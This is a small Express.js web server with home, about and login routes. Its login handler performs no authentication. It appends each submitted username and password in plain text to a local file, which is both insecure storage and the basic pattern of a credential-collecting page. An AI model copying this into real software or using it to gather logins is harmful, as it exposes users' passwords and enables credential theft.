const express = require('express');
const fs = require('fs');
const path = require('path')

const app = express();

app.use(express.static('public'));

app.use(express.urlencoded({ extended:true}))

app.get('/', (req,res)=>{
    res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

app.get('/about', (req,res)=>{
    res.sendFile(path.join(__dirname, 'public', 'aboutus.html'));
});

app.get('/login', (req,res)=>{
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req,res)=>{
    const { Username, Password} = req.body;
    const loginData = `Username: ${Username}\n Password: ${Password}`;

    fs.appendFile('logins.txt', loginData, (err)=>{
        if(err){
            console.error("Error loading");
            return res.status(500).send("Server error");
        }
        res.send("Login data received succesfully");
    });
});

app.listen(3000, ()=>{
    console.log("Server running on http://localhost:3000");
})